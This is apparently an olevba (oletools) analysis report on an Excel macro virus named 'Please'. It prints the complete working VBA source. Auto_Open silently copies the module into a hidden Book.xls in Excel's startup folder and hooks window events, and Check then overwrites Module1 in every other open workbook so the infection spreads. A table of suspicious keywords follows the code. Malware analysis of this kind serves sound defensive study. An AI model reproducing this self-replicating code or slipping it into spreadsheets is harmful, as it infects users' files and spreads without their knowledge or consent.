olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Please-db19427614bd27c7e96d50e6e2928d425247ce28
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Please-db19427614bd27c7e96d50e6e2928d425247ce28 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Please-db19427614bd27c7e96d50e6e2928d425247ce28 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Please-db19427614bd27c7e96d50e6e2928d425247ce28 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Please-db19427614bd27c7e96d50e6e2928d425247ce28 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Please-db19427614bd27c7e96d50e6e2928d425247ce28 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem i

Dim TM
Dim TC

Sub test()
    Application.OnWindow = "check"
End Sub

Sub Untest()
    Application.OnWindow = ""
End Sub


Sub Check_1()
    Check
End Sub

Sub Auto_Close()
    Application.OnWindow = ""
End Sub

Sub Auto_Open()
Dim NameOfCurrentWorkBook As String
Dim i
   Rem On Error Resume Next
   Application.ScreenUpdating = False
   Application.DisplayAlerts = False
   NameOfCurrentWorkBook = ThisWorkbook.Name
   If UCase(Dir(Application.StartupPath + "\Book.xls")) <> UCase("BOOK.xls") Then
    If NameOfCurrentWorkBook <> "Book.xls" Then
        Rem  Writing Book1 an Setting OnWindow
        If Workbooks.Count > 1 Then
            For i = 1 To Workbooks.Count ' check for Workbook with name Book1.xls
                If Workbooks(i).Name = "Book.xls" Then
                    Workbooks(i).Close
                End If
            Next i
        End If
        Rem writing Book1
        Set TM = ThisWorkbook.VBProject.VBComponents("module1").CodeModule
        Set NewBook1 = Application.Workbooks.Add
        Set TC = NewBook1.VBProject.VBComponents.Add(1).CodeModule
        For j = 1 To TM.CountOfLines
             TC.InsertLines j, TM.Lines(j, 1)
        Next j
        NewBook1.Activate
        ActiveWindow.Visible = False
        NewBook1.SaveAs Filename:=Application.StartupPath + "\Book.xls", AddToMru:=False
     End If
    End If
    Application.OnWindow = "Check_1"
    Application.ScreenUpdating = True
    Application.DisplayAlerts = True
End Sub

Sub Check()
Dim oldStatusBar
Dim QuantOfModules
Dim i, j As Integer
Dim ModuleExist As Boolean
Dim NameOfCurrentModule As String
Dim NewBook1

oldStatusBar = Application.DisplayStatusBar
Application.DisplayStatusBar = True
Application.ScreenUpdating = False
Application.DisplayAlerts = False
Rem On Error Resume Next
Set TM = ThisWorkbook.VBProject.VBComponents("module1").CodeModule
If TM <> Empty Then
    If Workbooks.Count > 1 Then
        For i = 2 To Workbooks.Count
            ModuleExist = False
            For j = 1 To Workbooks(i).VBProject.VBComponents.Count
                NameOfCurrentModule = Workbooks(i).VBProject.VBComponents.Item(j).Name
                If NameOfCurrentModule = "Module1" Then
                    ModuleExist = True
                End If
            Next j
            If ModuleExist <> True Then
                Set TC = Workbooks(i).VBProject.VBComponents.Add(1).CodeModule
            Else
                Set TC = Workbooks(i).VBProject.VBComponents("module1").CodeModule
            End If
            
            FirstLine = TC.Lines(1, 1)
            If FirstLine <> "Rem i" Then
                For l = 1 To TC.CountOfLines
                    TC.DeleteLines l, 1
                    Application.StatusBar = "Please be patient...-" + Str(l)
                Next l
                For j = 1 To TM.CountOfLines
                    TC.InsertLines j, TM.Lines(j, 1)
                    Application.StatusBar = "Please be patient...-" + Str(j)
                Next j
            End If
        Next i
    End If
End If
Application.StatusBar = False
Application.DisplayStatusBar = oldStatusBar
Application.ScreenUpdating = True
Application.DisplayAlerts = True
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

